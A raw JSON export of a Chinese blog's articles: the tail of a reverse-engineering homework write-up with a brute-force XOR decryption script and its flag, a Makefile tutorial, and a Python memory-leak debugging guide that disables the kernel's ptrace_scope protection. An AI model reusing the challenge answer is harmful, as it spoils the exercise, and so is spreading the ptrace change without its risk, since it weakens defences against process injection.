class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tres = <span class=\"string\">\"thisisasimplesamplestring\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">1597</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>]:</span><br><span class=\"line\">\t\tnum = list(str(n))</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i,b <span class=\"keyword\">in</span> enumerate(res):</span><br><span class=\"line\">\t\t\ttmp += chr((((ord(b) ^ ord(num[i % len(num)]) &amp; <span class=\"number\">0xff</span>) ^ key) &amp; <span class=\"number\">0xff</span>))</span><br><span class=\"line\">\t\tres = tmp</span><br><span class=\"line\">\tflag = res</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flag</span><br></pre></td></tr></table></figure>\n<p>为了求解flag，需要求解这个算法的逆算法。因为都是按位异或，很容易得到逆算法，并爆破所有可见字符即可catch flag。</p>\n<p>最终脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(key)</span>:</span></span><br><span class=\"line\">\tencrypted = <span class=\"string\">\"\\x3A\\x3B\\x31\\x38\\x23\\x3B\\x3C\\x34\\x37\\x30\\x0B\\x37\\x30\\x07\\x32\\x28\\x39\\x35\\x23\\x06\\x2E\\x2B\\x24\\x2A\"</span>[::<span class=\"number\">-1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">13</span>,<span class=\"number\">21</span>,<span class=\"number\">34</span>,<span class=\"number\">55</span>,<span class=\"number\">89</span>,<span class=\"number\">144</span>,<span class=\"number\">233</span>,<span class=\"number\">377</span>,<span class=\"number\">610</span>,<span class=\"number\">987</span>,<span class=\"number\">1597</span>,<span class=\"number\">2584</span>,<span class=\"number\">4181</span>,<span class=\"number\">6765</span>,<span class=\"number\">10946</span>,<span class=\"number\">17711</span>,<span class=\"number\">28657</span>][::<span class=\"number\">-1</span>]:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print n</span></span><br><span class=\"line\">\t\tnum = list(str(n))</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i,b <span class=\"keyword\">in</span> enumerate(encrypted):</span><br><span class=\"line\">\t\t\ti = len(encrypted) - i - <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print i</span></span><br><span class=\"line\">\t\t\ttmp += chr((((ord(b) ^ key &amp; <span class=\"number\">0xff</span>) ^ ord(num[(i % len(num))])) &amp; <span class=\"number\">0xff</span>))</span><br><span class=\"line\">\t\tencrypted = tmp</span><br><span class=\"line\">\tflag = encrypted</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> flag</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>, <span class=\"number\">126</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> chr(i)</span><br><span class=\"line\">\t\tres = decrypt(i)</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> res[::<span class=\"number\">-1</span>]</span><br></pre></td></tr></table></figure>\n<p>flag如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a</span><br><span class=\"line\">flag&#123;ocean_of_junks_zzz&#125;</span><br></pre></td></tr></table></figure>\n","text":"​    这学期《恶意代码分析》这门课的作业留了一道RE题，其中包含大量批量插入的花指令。在这里简单记录一下分析过程。0x00  基本分析首先动态执行程序看一下1<br>2<br>3<br>4<br>5<br>6<br>D:\\UCAS\\malware_analyse&gt;Ant","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"一个简单的Makefile教程","slug":"一个简单的Makefile教程","date":"2018-11-19T14:31:41.000Z","updated":"2018-11-19T15:38:42.000Z","comments":true,"path":"api/articles/一个简单的Makefile教程.json","excerpt":"","keywords":null,"cover":null,"content":"<p>Makefile是一种组织代码编译的简单方法。这个教程将会指导你编写中小规模项目的makefile文件。</p>\n<h2 id=\"0x00-一个简单的例子\"><a href=\"#0x00-一个简单的例子\" class=\"headerlink\" title=\"0x00  一个简单的例子\"></a>0x00  一个简单的例子</h2><p>让我们首先引入下面这三个文件，hellomake.c，hellofunc.c，hellomake.h：三者组成一个标准的C程序。</p>\n<p><code>hellomake.c</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;hellomake.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// call a function in another file</span></span><br><span class=\"line\">    myPrintHelloMake();</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hellofunc.c</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;hellomake.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">myPrintHelloMake</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello makefiles!\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>hellomake.h</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">example include file</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">myPrintHelloMake</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p>一般地，可以通过下面的指令编译这些代码</p>\n<p><code>gcc -o hellomake hellomake.c hellofunc.c -I.</code></p>\n<p>这将编译两个.c文件 hellomake.c、hellofunc.c，并且指定可执行文件的名字为hellomake。-I dir是指定搜索头文件的目录的路径为dir，而-I.是指定在当前目录下寻找。没有makefile的话，为了重复测试/修改/调试你的代码，常见的做法是用上方向键在终端中找到上一条指令，因而你就不用每次重新输入指令。</p>\n<p>不幸的是，这种做法有两个弊端。第一，如果你弄丢了编译指令或者换了一台计算机，你将不得不重新输入，导致效率极低。第二，如果你只修改了一个.c文件，每次都重新编译所有的文件也是耗时且低效的。因此，我们需要学习如何使用makefile。</p>\n<h2 id=\"0x01-Makefile1\"><a href=\"#0x01-Makefile1\" class=\"headerlink\" title=\"0x01  Makefile1\"></a>0x01  Makefile1</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hellomake: hellomake.c hellofunc.c</span><br><span class=\"line\">\tgcc -o hellomake hellomake.c hellofunc.c -I.</span><br></pre></td></tr></table></figure>\n<p>将上述规则（rule）写到文件Makefile或makefile中，放在同一路径下，然后键入make就可以执行相应的编译。另外，通过将指令所需要的文件列在第一行的冒号之后，make会知道规则hellomake在这些文件之一被修改时需要被执行。此时，你已经解决了问题1——不需要再使用上方向键了。</p>\n<p><em>gcc指令之前需要有一个tab，而且在任何指令之前必须有一个tab。(必须是tab不能是空格)</em></p>\n<h2 id=\"0x02-Makefile2\"><a href=\"#0x02-Makefile2\" class=\"headerlink\" title=\"0x02  Makefile2\"></a>0x02  Makefile2</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I.</span><br><span class=\"line\"></span><br><span class=\"line\">hellomake: hellomake.o hellofunc.o</span><br><span class=\"line\">\t$(CC) -o hellomake hellomake.o hellofunc.o</span><br></pre></td></tr></table></figure>\n<p>现在你已经定义了一些常量CC和CFLAGS。这些特殊的常量将告诉make指令我们将如何编译文件hellomake.c和hellofunc.c。特别地，CC表明所使用的C编译器，CFLAGS表明传递给编译器的参数。通过将目标文件——hellomake.o和hellofunc.o放在依赖列表和规则中，make知道它必须首先独立的编译.c为.o，然后将他们编译成一个可执行文件hellomake。</p>\n<p>使用这个形式的makefile对大多数小规模的项目十分有效。然而，头文件的依赖被遗忘了。举例来说，如果我们修改了hellomake.h，make将不会重新编译.c文件，即使它需要这么做。为了解决这个问题，我们需要指明.c文件所依赖的.h文件。通过再编写一个简单的规则并且添加进makefile中可以达成目的。</p>\n<h2 id=\"0x03-Makefile3\"><a href=\"#0x03-Makefile3\" class=\"headerlink\" title=\"0x03  Makefile3\"></a>0x03  Makefile3</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I.</span><br><span class=\"line\">DEPS=hellomake.h</span><br><span class=\"line\"></span><br><span class=\"line\">%.o: %.c $(DEPS)</span><br><span class=\"line\">\t$(CC) -c -o <span class=\"variable\">$@</span> $&lt; $(CFLAGS)</span><br><span class=\"line\"></span><br><span class=\"line\">hellomake: hellomake.o hellofunc.o</span><br><span class=\"line\">\t$(CC) -o hellomake hellomake.o hellofunc.o</span><br></pre></td></tr></table></figure>\n<p>这个例子首先定义了一个叫DEPS的变量，表示.c文件所依赖的头文件的集合。然后定义了一个规则应用于所有.o后缀的文件。这个规则指定每个.o文件依赖于相应的.c文件和DEPS所表示的.h文件。-c参数指定产生.o文件，-o $@说明将编译结果输出在<strong>冒号左边</strong>的名字的文件中，$&lt;是<strong>依赖列表中的第一个文件</strong>（即.c文件），最后加上其它编译参数。</p>\n<p>make执行的命令序列如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c -o hellomake.o hellomake.c -I.</span><br><span class=\"line\">gcc -c -o hellofunc.o hellofunc.c -I.</span><br><span class=\"line\">gcc -o hellomake hellomake.o hellofunc.o</span><br></pre></td></tr></table></figure>\n<p>为了最终简化，我们使用特殊的宏$@和$^使得编译规则更加普适化。</p>\n<p>$@表示冒号的左端、$^表示冒号的右端，$&lt;表示依赖列表中第一个文件</p>\n<h2 id=\"0x04-Makefile4\"><a href=\"#0x04-Makefile4\" class=\"headerlink\" title=\"0x04  Makefile4\"></a>0x04  Makefile4</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I.</span><br><span class=\"line\">DEPS=hellomake.h</span><br><span class=\"line\">OBJ=hellomake.o hellofunc.o</span><br><span class=\"line\"></span><br><span class=\"line\">%.o: %.c $(DEPS)</span><br><span class=\"line\">\t$(CC) -c -o <span class=\"variable\">$@</span> $&lt; $(CFLAGS)</span><br><span class=\"line\">\t</span><br><span class=\"line\">hellomake: $(OBJ)</span><br><span class=\"line\">\t$(CC) -o <span class=\"variable\">$@</span> $^ $(CFLAGS)</span><br></pre></td></tr></table></figure>\n<p>那如果我们想将.h文件放到include目录中，将源文件放到src目录中，将一些库放在lib目录中呢？此外，我们可以采用某种方法隐藏（其实只是一种障眼法hhh）那些无处不在的讨厌的.o文件吗？答案当然是可以的。下面这个makefile定义了src和lib目录的路径，并且将目标文件集中放在src目录下的obj子目录中。它也定义了表示所要包含的库的变量，例如数学库-lm。这个makefile需要放在src目录下。最后，定义了make clean的规则。</p>\n<h2 id=\"0x05-Makefile5\"><a href=\"#0x05-Makefile5\" class=\"headerlink\" title=\"0x05 Makefile5\"></a>0x05 Makefile5</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IDIR=../include</span><br><span class=\"line\">CC=gcc</span><br><span class=\"line\">CFLAGS=-I$(IDIR)</span><br><span class=\"line\"></span><br><span class=\"line\">ODIR=obj</span><br><span class=\"line\">LDIR=../lib</span><br><span class=\"line\"></span><br><span class=\"line\">LIBS=-lm</span><br><span class=\"line\"></span><br><span class=\"line\">_DEP=hellomake.h</span><br><span class=\"line\">DEPS=$(patsubst %,$(IDIR)/%,$(_DEP))</span><br><span class=\"line\"></span><br><span class=\"line\">_OBJ=hellomake.o hellofunc.o</span><br><span class=\"line\">OBJ=$(patsubst %,$(ODIR)/%,$(_OBJ))</span><br><span class=\"line\"></span><br><span class=\"line\">$(ODIR)/%.o: %.c $(DEPS)</span><br><span class=\"line\">\t$(CC) -c -o <span class=\"variable\">$@</span> $&lt; $(CFLAGS)</span><br><span class=\"line\">hellomake: $(OBJ)</span><br><span class=\"line\">\t$(CC) -o <span class=\"variable\">$@</span> $^ $(CFLAGS) $(LIBS)</span><br><span class=\"line\">\t</span><br><span class=\"line\">.PHONY: clean</span><br><span class=\"line\"></span><br><span class=\"line\">clean:</span><br><span class=\"line\">\trm -f $(ODIR)/*.o hellomake</span><br></pre></td></tr></table></figure>\n<p>.PHONY规则是为了避免二义性。</p>\n<p>另外，patsubstd的定义如下： <code>$(patsubst pattern,replacement,text)</code></p>\n<p>从text中寻找按空格划分的单词中符合pattern的，然后用replacement替换掉它。pattern可能包含一个’%’作为通配符，匹配单词中任何数量的字符。如果replacement中也包含’%’，则这个’%’会被pattern的’%’所匹配的内容所替换。</p>\n<p>##0x06  总结</p>\n<p>总之，编写一个makefile重点就是定义一些变量和一些规则，规则格式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">targets : prerequisites</span><br><span class=\"line\">\trecipe</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">targets : prerequisites ; recipe</span><br><span class=\"line\">\trecipe</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure>\n<p>大体上，先明确头文件，再写.o的生成规则，最后写二进制文件的生成规则即可。</p>\n<p>当然，还包括一些导向(directive)指令，主要包括：</p>\n<ul>\n<li>包含其它makefile文件</li>\n<li>控制语句</li>\n<li>定义多行变量</li>\n</ul>\n<p>理解了这些，对于中小规模的项目来说，编写一个makefile文件是非常容易的。当然，如果使用CMAKE，可能会更加便利，但是也需要额外的学习成本。</p>\n<blockquote>\n<p><a href=\"http://www.cs.colby.edu/maxwell/courses/tutorials/maketutor/\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n</blockquote>\n","text":"Makefile是一种组织代码编译的简单方法。这个教程将会指导你编写中小规模项目的makefile文件。0x00  一个简单的例子让我们首先引入下面这三个文件，hellomake.c，hellofunc.c，hellomake.h：三者组成一个标准的C程序。hellomake.c","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Dev","slug":"Dev","count":2,"path":"api/tags/Dev.json"}]},{"title":"调试并解决Python内存泄露问题","slug":"调试并解决Python内存泄露问题","date":"2018-11-05T13:46:33.000Z","updated":"2018-11-06T06:00:12.000Z","comments":true,"path":"api/articles/调试并解决Python内存泄露问题.json","excerpt":"","keywords":null,"cover":"https://i.imgur.com/zkbTrwr.png","content":"<p>0x00  问题引入<br>虽然Python本身有垃圾回收机制，但是也有内存泄露的可能。这里我对这次调试项目代码的经验作简单总结，予以参考。</p>\n<p>一般来说，可能出现内存泄露的情况，有如下几种：<br>1.对象被全局变量所引用，而生命周期较长<br>2.gc被禁用，使用<code>gc.disabled()</code>和<code>gc.enable()</code>进行操作<br>3.变量的循环引用。一般来说，只要开启gc，即使存在变量的循环引用，也不会导致内存泄露。但如果对象属于不可回收的，就无法处理。不可回收的变量通过<code>gc.garbage</code>查看，实际上就是实现了<code>__del__()</code>方法的对象</p>\n<p>python的官方文档中对garbage方法的说明如下：</p>\n<blockquote>\n<p>A list of objects which the collector found to be unreachable but could not be freed (uncollectable objects). By default, this list contains only objects with <code>__del__()</code> methods. [1] Objects that have <code>__del__()</code> methods and are part of a reference cycle cause the entire reference cycle to be uncollectable, including objects not necessarily in the cycle but reachable only from it. Python doesn’t collect such cycles automatically because, in general, it isn’t possible for Python to guess a safe order in which to run the <code>__del__()</code> methods. </p>\n</blockquote>\n<p>简单解释一下，垃圾回收器会将不可达但不能被释放的对象标识为garbage。默认garbage列表只包含实现了<code>__del__()</code>方法的对象，这些对象属于一个循环引用的话会导致整个循环引用变得不可被回收。Python不会自动地回收这些循环，因为基本上Python不可能猜到真正安全的执行<code>__del__()</code>方法的顺序。当然如果你自己知道如何处理，可以用类似<code>del gc.garbage[:]</code>的方法在循环结束后手动释放。</p>\n<hr>\n<p>0x01  辅助工具</p>\n<p>首先推荐安装第三方工具Pyrasite，它可以在Python进程动态运行时修改数据和代码等，这显然有利于我们调试内存泄漏问题。它的最新版安装需要gdb(7.3版本以上)和Python2.4以上的环境。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(sudo) pip install pyrasite pyrasite-gui</span><br></pre></td></tr></table></figure></p>\n<p>如果操作系统是Ubuntu10.10以上，需要首先执行<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure></p>\n<p>也可以通过设置<code>/etc/sysctl.d/10-ptrace.conf</code>中ptrace_scope为0来永久修改</p>\n<p>我们主要用到的是pyrasite-shell和pyrasite-memory-viewer。其中pyrasite-shell的用法如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ pyrasite-shell</span><br><span class=\"line\">Usage: pyrasite-shell &lt;PID&gt;</span><br></pre></td></tr></table></figure></p>\n<p>输入相应Python进程的pid，得到一个shell与其进行交互，这个shell类似ipython。我们首先让存在内存泄漏问题的Python脚本运行起来，然后用pyrasite-shell getshell，就可以输入一些命令观察结果，从而定位问题。<br>pyrasite-memory-viewer则需首先安装urwid和meliae：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(sudo) pip install urwid meliae</span><br><span class=\"line\"></span><br><span class=\"line\">$ pyrasite-memory-viewer &lt;PID&gt;</span><br></pre></td></tr></table></figure></p>\n<p>界面会列出当前对象内存占用的统计，按占用大小排序，包含对象的数量、总大小、百分比、对象类型名等信息，点选单个对象后将打印出对象的内容</p>\n<hr>\n<p>0x02  调试过程</p>\n<p>首先将我们的Python程序运行起来，然后用pyrasite-shell注入。<br>首先用gc模块的相关方法查看是否是垃圾回收的问题<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Connected to &apos;python xxx.py&apos;</span><br><span class=\"line\">Python 2.7.12 (default, Dec  4 2017, 14:50:18) </span><br><span class=\"line\">[GCC 5.4.0 20160609] on linux2</span><br><span class=\"line\">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class=\"line\">(DistantInteractiveConsole)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; import gc</span><br><span class=\"line\">&gt;&gt;&gt; gc.isenabled()</span><br><span class=\"line\">True</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; gc.garbage</span><br><span class=\"line\">[&lt;PtraceProcess #15277&gt;, &lt;PtraceProcess #15282&gt;, &lt;PtraceProcess #15287&gt;, &lt;PtraceProcess #15292&gt;, &lt;PtraceProcess #15297&gt;, &lt;PtraceProcess #15302&gt;, </span><br><span class=\"line\">&lt;PtraceProcess #15307&gt;, &lt;PtraceProcess #15312&gt;, &lt;PtraceProcess #15317&gt;,  .......</span><br></pre></td></tr></table></figure></p>\n<p>说明垃圾回收已开启，但多执行几次gc.garbage，发现这个叫做PtraceProcess的对象的数量在不断增加。实际上，这个对象是第三方python-ptrace模块中所定义的，查看其源码。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def __del__(self):</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            self.detach()</span><br><span class=\"line\">        except PtraceError:</span><br><span class=\"line\">            pass</span><br></pre></td></tr></table></figure></p>\n<p>果然定义了<code>__del__()</code>方法，这里可以使用objgraph模块作出此对象的循环引用图，从而直观的判断到底是哪里出现问题。具体安装和使用方法并不复杂，这里不再赘述，只给出样例图。<br><img src=\"https://i.imgur.com/zkbTrwr.png\" alt></p>\n<p>但是，在我将PtraceProcess的<code>__del__()</code>方法注释掉之后，问题仍然存在。这令我有些费解，这时想到去研究一下linux自带的top命令。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">top - 13:24:30 up 2 days, 11:37,  1 user,  load average: 0.54, 0.82, 0.93</span><br><span class=\"line\">Tasks: 286 total,   1 running, 285 sleeping,   0 stopped,   0 zombie</span><br><span class=\"line\">%Cpu(s):  6.1 us,  5.8 sy,  0.0 ni, 87.7 id,  0.1 wa,  0.0 hi,  0.3 si,  0.0 st</span><br><span class=\"line\">KiB Mem :  4016440 total,   249140 free,  2123672 used,  1643628 buff/cache</span><br><span class=\"line\">KiB Swap:  4192252 total,  4175600 free,    16652 used.  1304868 avail Mem </span><br><span class=\"line\"></span><br><span class=\"line\">   PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                           </span><br><span class=\"line\"> 32514 liwc      20   0  247852  52012   7468 S  69.1  1.3   0:08.44 python</span><br></pre></td></tr></table></figure></p>\n<p>可以看到%MEM、VIRT、RES、SHR这几项都在不断地增大，其中%MEM顾名思义就是内存的占用量，而VIRT是进程使用的虚拟内存总量、RES是进程使用的、未被换出的物理内存大小，SHR是以共享方式使用的内存大小。因为项目代码使用了用shmget申请的共享内存，所以我格外关注SHR的含义。通过查找资料得知，SHR包括：</p>\n<blockquote>\n<p>程序的代码段<br>动态库的代码段<br>通过mmap做的文件映射<br>通过mmap做的匿名映射，但指明了MAP_SHARED属性<br>通过shmget申请的共享内存</p>\n</blockquote>\n<p>在大佬的提示下，又发现内存增长的总量全部来自于SHR部分，这不禁使我怀疑是该部分代码有问题。使用pmap指令查看进程的内存映射关系:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">97523:   python xxx.py</span><br><span class=\"line\">0000000000400000   2936K r-x-- python2.7</span><br><span class=\"line\">00000000008dd000      4K r---- python2.7</span><br><span class=\"line\">00000000008de000    476K rw--- python2.7</span><br><span class=\"line\">0000000000955000    140K rw---   [ anon ]</span><br><span class=\"line\">0000000000b7a000  33564K rw---   [ anon ]</span><br><span class=\"line\">00007f6465c10000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">00007f6465c20000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">00007f6465c30000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">...</span><br><span class=\"line\">00007f6479e93000     64K rw-s-   [ shmid=0x6aac8bca ]</span><br><span class=\"line\">00007f6479ea3000      4K -----   [ anon ]</span><br><span class=\"line\">00007f6479ea4000   8192K rw---   [ anon ]</span><br><span class=\"line\">...</span><br><span class=\"line\"> total           447084K</span><br></pre></td></tr></table></figure></p>\n<p>发现同一块用shmget申请的共享内存被映射到进程空间内数次，看来这个就是吃掉内存的元凶。事实上，就是shmat函数被错误地调用了多次，从而被映射了多次。修正代码后，问题解决。</p>\n<hr>\n<p>0x03  问题总结</p>\n<p>总之，感觉出现疑似内存泄漏时，应该首先用pyrasite-shell连上看一下，排除循环引用等垃圾回收的问题，同时注意观察pmap、top等命令的结果。</p>\n","text":"0x00  